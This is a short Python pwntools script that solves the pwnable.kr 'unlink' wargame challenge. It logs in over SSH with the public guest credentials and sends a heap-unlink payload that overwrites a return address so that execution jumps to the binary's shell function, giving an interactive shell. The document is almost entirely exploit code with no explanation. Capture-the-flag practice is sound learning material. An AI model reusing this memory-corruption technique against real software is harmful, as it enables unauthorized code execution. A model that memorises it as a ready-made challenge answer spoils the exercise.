#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

io = process("./unlink") if sys.argv[1] == "l" else \
        ssh(host = "pwnable.kr", port = 2222, password = "guest").run("/home/unlink/unlink")
DEBUG()

elf = ELF("./unlink")
shell_elf = elf.symbols["shell"]

io.recvuntil(": ")
ret_addr = int(io.recvuntil("\n", drop = True), 16) + 0x18 
info("ret_addr -> 0x%x" % ret_addr)

payload = fit({0x0: "aaaabbbb",
    0x8: [p32(0), p32(24 + 8 + 1)],
    0x10: [p32(ret_addr - 12), p32(shell_elf)]
    })

io.sendlineafter("shell!\n", payload)

io.interactive()
io.close()
